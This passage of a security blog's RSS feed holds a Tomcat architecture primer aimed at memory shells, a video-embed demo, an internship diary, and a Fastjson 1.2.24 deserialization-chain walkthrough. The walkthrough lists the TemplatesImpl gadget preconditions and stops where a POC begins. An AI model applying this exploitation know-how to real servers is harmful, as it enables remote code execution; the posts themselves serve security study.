这张图来感受一下他们之间的层次关系。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;能够看出来层次关系大致是遵循树形结构的（wrapper和servlet肯定不是，人家就是一对一的），从这张图的边角注释基本也能猜出来，各个容器的职能，但还是来做一下具体解释。&lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;Engine：表示整个 Catalina 的 Servlet 引擎，用来管理多个虚拟站点，一个 Service 最多只能有一个 Engine，但是一个引擎可包含多个 Host&lt;/li&gt;
&lt;li&gt;Host：代表一个虚拟主机，或者说一个站点，可以给 Tomcat 配置多个虚拟主机地址，而一个虚拟主机下可包含多个 Context&lt;/li&gt;
&lt;li&gt;Context：表示一个 Web 应用程序，每一个Context都有唯一的path，一个Web应用可包含多个 Wrapper&lt;/li&gt;
&lt;li&gt;Wrapper：表示一个Servlet，负责管理整个 Servlet 的生命周期，包括装载、初始化、资源回收等&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;以上就是关于Connector组件中子容器的介绍，但我们重新回到那个图里面，我们仍然可以发现子容器之中亦有迷雾尚未解开，就比如每个容器都出现的那个 &lt;code&gt;Pipeline&lt;/code&gt; 我们就不清楚它到底是什么东西。这里就要再介绍一下Tomcat 的 阀和管道 机制。&lt;/p&gt;
&lt;p&gt;首先什么是管道？我们可以先看一下接口的定义&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public interface Pipeline extends Contained {  
    public Valve getBasic();  
    public void setBasic(Valve valve);  
    public void addValve(Valve valve);  
    public Valve[] getValves();  
    public void removeValve(Valve valve);  
    public void findNonAsyncValves(Set&amp;lt;String&amp;gt; result);  
}  
//上面是管道
public interface Valve { 
    public Valve getNext();  
    public void setNext(Valve valve);  
    public void backgroundProcess();  
    public void invoke(Request request, Response response)  throws IOException, ServletException;  
    public boolean isAsyncSupported();   
}
//上面是阀
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看出来，阀是由管道所调度掌控的，一个管道可以拥有多个阀，但管道并不直接实现功能，而是由阀所掌控的阀来实现具体功能（就是Valve#invoke）这里来实现。他们的运行机制有点类似于FilterChain那种责任链机制，层层外包，通力协作，当一个管道所有的阀的被调度完成，则最后一个阀可以调度别的管道的首阀开始新一轮的外包协作。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/%E7%AE%A1%E9%81%93%E6%9C%BA%E5%88%B6.jpg&quot; alt=&quot;&quot; /&gt;
(这个图略了点，只有一个管道，稍微抽象点，但毕竟图是偷的，凑合着看吧)&lt;/p&gt;
&lt;h3&gt;Tomcat中三个Context&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ServletContext&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;package javax.servlet;  
...  
public interface ServletContext {  
    String TEMPDIR = &quot;javax.servlet.context.tempdir&quot;;  
    String ORDERED_LIBS = &quot;javax.servlet.context.orderedLibs&quot;;  
    String getContextPath();  
    ServletContext getContext(String var1);  
    Servlet getServlet(String var1) throws ServletException;  
    Enumeration&amp;lt;Servlet&amp;gt; getServlets();  
    Enumeration&amp;lt;String&amp;gt; getServletNames();  
    void log(String var1);  
    void log(Exception var1, String var2);  
    void log(String var1, Throwable var2);  
    String getRealPath(String var1);  
    String getServerInfo();  
    String getInitParameter(String var1);  
    Enumeration&amp;lt;String&amp;gt; getInitParameterNames();  
    boolean setInitParameter(String var1, String var2);  
    Object getAttribute(String var1);  
    Enumeration&amp;lt;String&amp;gt; getAttributeNames();  
    void setAttribute(String var1, Object var2);  
    void removeAttribute(String var1);  
    String getServletContextName();  
    Dynamic addServlet(String var1, String var2);  
    Dynamic addServlet(String var1, Servlet var2);  
    Dynamic addServlet(String var1, Class&amp;lt;? extends Servlet&amp;gt; var2);  
    Dynamic addJspFile(String var1, String var2);  
    &amp;lt;T extends Servlet&amp;gt; T createServlet(Class&amp;lt;T&amp;gt; var1) throws ServletException;  
    ServletRegistration getServletRegistration(String var1);  
    Map&amp;lt;String, ? extends ServletRegistration&amp;gt; getServletRegistrations();  
    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, String var2);  
    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Filter var2);  
    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Class&amp;lt;? extends Filter&amp;gt; var2);  
    &amp;lt;T extends Filter&amp;gt; T createFilter(Class&amp;lt;T&amp;gt; var1) throws ServletException;  
    FilterRegistration getFilterRegistration(String var1);  
    Map&amp;lt;String, ? extends FilterRegistration&amp;gt; getFilterRegistrations();  
    SessionCookieConfig getSessionCookieConfig();  
    void setSessionTrackingModes(Set&amp;lt;SessionTrackingMode&amp;gt; var1);  
    Set&amp;lt;SessionTrackingMode&amp;gt; getDefaultSessionTrackingModes();  
    Set&amp;lt;SessionTrackingMode&amp;gt; getEffectiveSessionTrackingModes();  
    void addListener(String var1);  
    &amp;lt;T extends EventListener&amp;gt; void addListener(T var1);  
    void addListener(Class&amp;lt;? extends EventListener&amp;gt; var1);  
    &amp;lt;T extends EventListener&amp;gt; T createListener(Class&amp;lt;T&amp;gt; var1) throws ServletException;  
    JspConfigDescriptor getJspConfigDescriptor();  
    ClassLoader getClassLoader();  
    void declareRoles(String... var1);  
    String getVirtualServerName();  
    int getSessionTimeout();  
    void setSessionTimeout(int var1);  
    String getRequestCharacterEncoding();  
    void setRequestCharacterEncoding(String var1);  
    String getResponseCharacterEncoding();  
    void setResponseCharacterEncoding(String var1);  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当我们使用Tomcat这样的Java Web服务器时，它提供了一个特殊的对象叫做ServletContext（Servlet上下文）。可以把ServletContext看作是一个容器，它存储了与Web应用程序相关的信息和功能。通俗来说，ServletContext就像是整个Web应用程序的大本营。它保存了所有在同一个Web应用程序中运行的Servlet共享的数据、配置和资源。可以把它看作是一个大家庭的家长，负责协调和管理每个Servlet的需求，并提供它们需要的支持。我们所有的Servlet都得对其进行实现。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ApplicationContext
在Tomcat中，ServletContext接口的具体实现就是ApplicationContext类，其实现了ServletContext接口中定义的一些方法。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;StandardContext
&lt;code&gt;org.apache.catalina.core.StandardContext&lt;/code&gt;是子容器&lt;code&gt;Context&lt;/code&gt;的标准实现类，其中包含了对Context子容器中资源的各种操作。也是我们内存马这里真正起到作用的类。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;总结以下大致如下
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/ThreeContext.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;引用下别的师傅的话&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ServletContext接口的实现类为ApplicationContext类和ApplicationContextFacade类，其中ApplicationContextFacade是对ApplicationContext类的包装。我们对Context容器中各种资源进行操作时，最终调用的还是StandardContext中的方法，因此StandardContext是Tomcat中负责与底层交互的Context。
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;三大组件加载顺序&lt;/h3&gt;
&lt;p&gt;三者的加载顺序为&lt;code&gt;Listener-&amp;gt;Filter-&amp;gt;Servlet&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if (ok) {
                if (!listenerStart()) {
                    log.error(sm.getString(&quot;standardContext.listenerFail&quot;));
                    ok = false;
                }
            }
            try {
                // Start manager
                Manager manager = getManager();
                if (manager instanceof Lifecycle) {
                    ((Lifecycle) manager).start();
                }
            } catch(Exception e) {
                log.error(sm.getString(&quot;standardContext.managerFail&quot;), e);
                ok = false;
            }
            // Configure and call application filters
            if (ok) {
                if (!filterStart()) {
                    log.error(sm.getString(&quot;standardContext.filterFail&quot;));
                    ok = false;
                }
            }
            // Load and initialize all &quot;load on startup&quot; servlets
            if (ok) {
                if (!loadOnStartup(findChildren())){
                    log.error(sm.getString(&quot;standardContext.servletFail&quot;));
                    ok = false;
                }
            }
            // Start ContainerBackgroundProcessor thread
            super.threadStart();
        }if (ok) {
                if (!listenerStart()) {
                    log.error(sm.getString(&quot;standardContext.listenerFail&quot;));
                    ok = false;
                }
            }
            try {
                // Start manager
                Manager manager = getManager();
                if (manager instanceof Lifecycle) {
                    ((Lifecycle) manager).start();
                }
            } catch(Exception e) {
                log.error(sm.getString(&quot;standardContext.managerFail&quot;), e);
                ok = false;
            }
            // Configure and call application filters
            if (ok) {
                if (!filterStart()) {
                    log.error(sm.getString(&quot;standardContext.filterFail&quot;));
                    ok = false;
                }
            }
            // Load and initialize all &quot;load on startup&quot; servlets
            if (ok) {
                if (!loadOnStartup(findChildren())){
                    log.error(sm.getString(&quot;standardContext.servletFail&quot;));
                    ok = false;
                }
            }
            // Start ContainerBackgroundProcessor thread
            super.threadStart();
        }
 
...
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;参考链接&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Tomcat/Tomcat%E4%BB%8B%E7%BB%8D/Tomcat%E4%BB%8B%E7%BB%8D.md&quot;&gt;Y4tacker Tomcat架构介绍&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://goodapple.top/archives/1355&quot;&gt;Java安全学习——内存马 - 枫のBlog (goodapple.top)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://drun1baby.top/2022/08/19/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-01-%E5%9F%BA%E7%A1%80%E5%86%85%E5%AE%B9%E5%AD%A6%E4%B9%A0/&quot;&gt;DrunkBayby 内存马介绍&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded></item><item><title>Include Video in the Posts</title><link>https://f4miti0n.github.io/posts/video/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/video/</guid><description>This post demonstrates how to include embedded video in a blog post.</description><pubDate>Tue, 01 Aug 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Just copy the embed code from YouTube or other platforms, and paste it in the markdown file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;---
title: Include Video in the Post
published: 2023-10-19
// ...
---

&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;https://www.youtube.com/embed/5gIf0_xpFPI?si=N1WTorLKL0uwLsU_&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;YouTube&lt;/h2&gt;
&lt;p&gt;&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;https://www.youtube.com/embed/5gIf0_xpFPI?si=N1WTorLKL0uwLsU_&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
&lt;h2&gt;Bilibili&lt;/h2&gt;
&lt;p&gt;&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;//player.bilibili.com/player.html?bvid=BV1fK4y1s7Qf&amp;amp;p=1&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; allowfullscreen=&quot;true&quot;&amp;gt; &amp;lt;/iframe&amp;gt;&lt;/p&gt;
</content:encoded></item><item><title>7月闲谈</title><link>https://f4miti0n.github.io/posts/%E9%97%B2%E8%B0%88/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/%E9%97%B2%E8%B0%88/</guid><pubDate>Thu, 20 Jul 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;除了在月初的那几天短暂潇洒了一会儿，这个月的时间几乎都贡献给了济南的网安市场，而微信余额，则是贡献给了济南的租房市场。是的，我正在济南实习。&lt;/p&gt;
&lt;p&gt;实习的公司，我不知道能不能算的上是一家大公司，名字叫绿盟，在网安行业里面其实也算是颇有名气。但如果是和隔壁的经十路长明灯相比，那确实就又黯然失色了不少。所以一般被朋友问到在哪里实习，我都不会直接说出绿盟的名字，而是旁敲侧击地暗示实习地点在浪潮附近，渐渐地，大家都觉得我在浪潮附近的咖啡店找了一份不错的新工作（扯淡ing）。&lt;/p&gt;
&lt;p&gt;报道第一天，大概15号那会儿，老板特意在微信上叮嘱我，让我务必要穿的成熟一点，思来想去之下，最终选择了一件经典的红色格子衫。而之所以选择穿它去报道，并不是因为真的觉得它有多么的成熟好看，亦或者是符合技术人的精神面貌，而是这回带来的衣服，除了那几件休闲款式，剩下的都是些同行友商的logo衫，穿上过去效果不一定有我裸着过去合适。到了公司之后，第一件事并不是见老板，而是去见见我的导师，一个素未谋面、甚至连微信都还没加的导师。虽然他是我的导师吧，但年龄上其实并没有大我多少，甚至导师在企微上的头像还是个穿和服的路飞（大概是和之国篇的），这让我有点纠结怎么称呼的这个问题。叫X哥吧，他毕竟是来带做我项目的；叫X老师吧，毕竟年龄上差不了太多，稍微有点奇怪。但是想起楼下超意兴饭馆哪个打饭大妈这几天热切喊我“老师”的样子，我最终还是决定称呼他为X老师。&lt;/p&gt;
&lt;p&gt;X老师挺忙的，说是老师吧，但其实没怎么管过我，带我学习的部分主要还是第一天配公司邮箱那会儿。说实话那个邮箱真是相当难配，比我配过最复杂的环境都要再复杂一点。我以为是我之前在本机上乱调代理的问题，才导致现在一直连不上公司的邮箱服务器，前前后后一趟又一趟在几个工位间来回穿梭，像个无头苍蝇一样骚扰着X老师。几次三番沟通下来，各种配置一通乱改，熬到了中午都还没有解决，X老师甚是不解，我也甚是不解。但最终也是缘分到了，我也终于搞明白了一切的真相。原来在这个公司里，我并不是我名字的唯一占有者，还有一个早就来的哥们正与我一同享受这份殊荣。而遵循先来后到的原则，在这个以名字作为用户名的公司里，我的用户名后面就凭空多了一个2，只有在用户名上把这个2多打上去，我才能进行我想进行的一切操作。我多少有点郁闷，不是因为过了这么久才配好环境，而是因为我的名字被加上一个二字，这实属难听。如若我是叫张磊这样的名字，那被加上个二倒也没什么大不了的，但我的名字，从格式来讲，却是无限接近于张一这种格式的，连起来的话读的话就是张一2。如果这个名字是个幼儿园的小朋友来读，我可能还多少会感到欣慰，毕竟如此轻松地就帮他掌握了数数这项基本技能，肯定算的上是功德一件。但在满是成年人的网安公司里，这份功德就变得难以积攒了。&lt;/p&gt;
&lt;p&gt;实习的日子好像就前几天还比较有趣，后面的日子也不过是无趣生活的一次次的合辙押韵而已，没有想像中的那么差，但也没有想像中的那么好，学到了很多东西，但更多的原因是因为租了一个小公寓，有了一个比较不错的学习环境。X老师在出差，没什么功夫带我。我也只是在工位上每天学习着杂七杂八的东西，刚才还在学渗透实战，一转头又开始研究起了codeql的代码审计，回到出租屋里如果还有精力，就去看看最近的CTF题目，没有精力就躺在沙发上刷刷短视频蹉跎会儿光阴。舍友偶尔会自言自语两句，我也会跟着应他一下，就像他偶尔也会应我一下那样。同事的关系因为刚认识的原因，处的并不算熟络，但也确实算不上讨厌。只是我总会自大的觉得，那几个新来的实习生，水平上还略有欠缺，即使他们配好邮箱的速度基本都远快于我，在后面配各种环境的时候，也往往一帆风顺，但我确实不愿意承认水平不如他们这一点，至少在我的博客里是绝不会承认的。&lt;/p&gt;
&lt;p&gt;到了月末，也就是现在的这个时间段上了，无聊的渗透生活被无穷的数通给彻底取代了。NF、IDS、IPS......，配不完的网关，加不完的班。明明只是几个基础实验而已，却总是因为各种的环境问题和前置知识缺乏给强行拉低了工作效率，带我的导师也并不是之前提到过的X老师，而是一个用户名带个5的师傅来讲的课。五师傅的课讲的很快，加上我喜欢走神，很多地方听的都不是很明白，面对各种各样的实验完全是一头雾水，而其他的实习生状况则也好不到哪里去。在一间不大的会议室里面，大家聚在一起蹉跎着光阴，等待着8月份的hvv。&lt;/p&gt;
&lt;p&gt;7月份基本就是这么过去的，其实还有很多东西可以扩展写一下，但写到这里我就已经感觉没有意思了，普通人的生活往往都是乏善可陈的，平淡的生活往往也没有那么多好的素材可以挑选，再加上我也不是个作家，没人会因为这几篇没人看的博文而给我稿费让我肆无忌惮的开空调，X老师也不会因为看了这几篇博文就立马效率百倍把活都干完，回公司带我做渗透，一切都不会改变，就像我用户名后面的2一样，在数据库丢失重置之前，永远都跟在我的名字后面。&lt;/p&gt;
</content:encoded></item><item><title>Fastjson利用链初探</title><link>https://f4miti0n.github.io/posts/fastjson%E3%81%AE%E4%BB%BB%E6%84%8Fget%E4%B8%8Eset/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/fastjson%E3%81%AE%E4%BB%BB%E6%84%8Fget%E4%B8%8Eset/</guid><pubDate>Sun, 21 May 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;一篇关于Fastjson利用链调试的文章&lt;/p&gt;
&lt;h2&gt;准备文件&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;pom.xml&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  
  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;&amp;gt;  
  &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt;  
  &amp;lt;groupId&amp;gt;org.example&amp;lt;/groupId&amp;gt;  
  &amp;lt;artifactId&amp;gt;untitled&amp;lt;/artifactId&amp;gt;  
  &amp;lt;version&amp;gt;1.0-SNAPSHOT&amp;lt;/version&amp;gt;  
  &amp;lt;name&amp;gt;Archetype - untitled&amp;lt;/name&amp;gt;  
  &amp;lt;dependencies&amp;gt;    
  &amp;lt;dependency&amp;gt;     
   &amp;lt;groupId&amp;gt;com.alibaba&amp;lt;/groupId&amp;gt;  
      &amp;lt;artifactId&amp;gt;fastjson&amp;lt;/artifactId&amp;gt;  
      &amp;lt;version&amp;gt;1.2.24&amp;lt;/version&amp;gt;  
    &amp;lt;/dependency&amp;gt;
      &amp;lt;/dependencies&amp;gt;  
      &amp;lt;url&amp;gt;http://maven.apache.org&amp;lt;/url&amp;gt;  
&amp;lt;/project&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;test.java&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import com.alibaba.fastjson.JSON;  
import com.alibaba.fastjson.serializer.SerializerFeature;  
public class test {  
    public static void main(String[] args) {  
        user user = new user(&quot;张三&quot;,18,&quot;学习&quot;);  
        String s1 = JSON.toJSONString(user);  
        //toJSONString序列化对象的时候,会调用get方法  
        String s2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);  
        System.out.println(s1);  
        System.out.println(s2);  
        System.out.println(&quot;-----------------------------------------------------&quot;);  
        Object parse = JSON.parse(s2);  
        System.out.println(parse);  
        System.out.println(parse.getClass().getName());  
        //普通的parse什么也不调用,默认转成了JSONObject对象  
        System.out.println(&quot;-----------------------------------------------------&quot;);  
        Object parse1 = JSON.parseObject(s2);  
        System.out.println(parse1);  
        System.out.println(parse1.getClass().getName());  
        //普通的JSON.parseObjec什么也不调用,默认转成了JSONObject对象  
        System.out.println(&quot;-----------------------------------------------------&quot;);  
        Object parse2 = JSON.parseObject(s2,Object.class);  
        System.out.println(parse2);  
        System.out.println(parse2.getClass().getName());  
        //指定了对象的JSON.parseObject什么也不调用,默认转成了JSONObject对象  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;流程分析の任意set&lt;/h2&gt;
&lt;p&gt;在JSON.parse这里下一个断点,跟进去
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230522200418.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跳几步parser重载，来到&lt;code&gt;DefaultJSONParser.parse&lt;/code&gt;这里,经过一系列条件判断(其实就看text的第一个字符是什么，这里因为是左括号，所以给他判定为了json解析，用的是json解析器)调用了&lt;code&gt;parseObject(object, fieldName)&lt;/code&gt;，跟进一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230522201414.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;可以看到，在这个parseObject代码里的最后部分完成了反序列化操作，先得到反序列化器，再执行反序列化，前面会通过一套相当麻烦的流程取到当前正在解析的key的名称，如果他是@type类型的，就去获取这个typename的类对象，作为后续反序列化器的参数进行加载，这里咱们如果想要继续调试，还得接着跟进一下反序列化器(  &lt;code&gt;getDeserializer&lt;/code&gt;  ) 这里
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230522201653.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;经过一堆缓存加载判断，我们来到了&lt;code&gt;createJavaBeanDeserializer&lt;/code&gt;这里（可喜可贺），我们接着跟进
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230522205056.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;我们直接来到了asmEnable判断这里，这里非常的关键，只有当这里的asmEnable为false，我们才能得到一个真正意义上可调试的反序列化器（这里是用户自定义反序列化器），如果不管的话，他就会用asm自己搞一个没法调试的反序列化器（相关代码如下）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, type, propertyNamingStrategy);
return asmFactory.createJavaBeanDeserializer(this, beanInfo);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里是直接在idea里面给asmEnable设值过的，不过其实也有别的办法
(比如给要反序列化的对象插一个Map的属性)
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230522205310.png&quot; alt=&quot;&quot; /&gt;
得到一个能用的反序列化器之后,再重新跟进一下&lt;code&gt;DefaultJsonParser&lt;/code&gt;里
&lt;code&gt;return deserializer.deserialze(this, clazz, fieldName)&lt;/code&gt;这段代码。
我们新的关键点如下图所示,嗯,是一个设置属性值得地方
(他会先把所有属性给遍历一遍,然后用反射把每个属性的值给搞出来，赋给object)
我们跟进一下
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230522210508.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;最终结果如下，就在调用的set方法，要注意一下，这个方法不能是个getonly的方法，不然就没办法了(都能set了,怎么可能是个getonly方法)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230522214737.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;最后再提一下吧，有关于method的获取都是在那个JavaBeanSerializer类里面搞得，其基本要求如下
对Set方法的要求：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;方法名不小于4&lt;/li&gt;
&lt;li&gt;方法不得为静态方法&lt;/li&gt;
&lt;li&gt;方法的返回类型得是void或者是方法本身所属的类&lt;/li&gt;
&lt;li&gt;方法的参数类型有且仅有一个&lt;/li&gt;
&lt;li&gt;方法名称以set开头，且第四个字母为大写&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对Get方法的要求:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;方法名不小于4&lt;/li&gt;
&lt;li&gt;方法不得为静态方法&lt;/li&gt;
&lt;li&gt;方法名称以get开头，且第四个字母为大写&lt;/li&gt;
&lt;li&gt;方法不能有参数&lt;/li&gt;
&lt;li&gt;返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;流程分析の任意get&lt;/h4&gt;
&lt;p&gt;再去分析一下parseObject这里,我们跟进
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523094609.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;结果如图,能看出里面已经把parse封装好了(会调用set的罪魁祸首就是你)
然后我们试着跟进一下 &lt;code&gt;JSON.toJSON()&lt;/code&gt; ,就是这里完成的get调用&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523094625.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;在最终起作用的toJSON里，会对传入的javaObject进行一系列判断，根据javaObject的类型决定后续的操作，由于这里是用户自定义的&lt;code&gt;java bean&lt;/code&gt;对象，最终是来到了下图所示代码区，通过此处的代码，我们成功的把 &lt;code&gt;javaObject&lt;/code&gt; 的属性和属性值转化成了一个map，接着跟进&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523094938.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;道理是一样的，遍历get方法，跟进&lt;code&gt;getPropertyValue&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523100522.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;第一行就在获取属性值了，跟进&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523100653.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这里的method默认就是getXXX，然后就直接给调用了。。。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Fastjson%E4%BB%BB%E6%84%8Fget%2Cset%2801%29/%E5%9B%BE%E7%89%87%E5%BA%93/Pasted%20image%2020230523101137.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;流程分析のTemplate链&lt;/h2&gt;
&lt;h3&gt;前置条件&lt;/h3&gt;
&lt;p&gt;首先前置条件如下:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;fastjson反序列化时需有&lt;code&gt;Feature.SupportNonPublicField&lt;/code&gt;参数
&lt;ul&gt;
&lt;li&gt;（Fastjson默认只能反序列化public属性）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_bytecodes[]&lt;/code&gt;需进行base64编码&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_bytecodes[]&lt;/code&gt;中加载的类需为&lt;code&gt;AbstractTranslet&lt;/code&gt;的子类&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_name&lt;/code&gt;不为null&lt;/li&gt;
&lt;li&gt;&lt;code&gt;_tfactory&lt;/code&gt;不为null&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;相关文件&lt;/h3&gt;
&lt;h4&gt;&lt;code&gt;POC&lt;/code&gt;&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;import com.alibaba.fastjson.JSON;  
import com.alibaba.fastjson.parser.Feature;  
public class POC1 {  
    public static void main(String[] args) {  
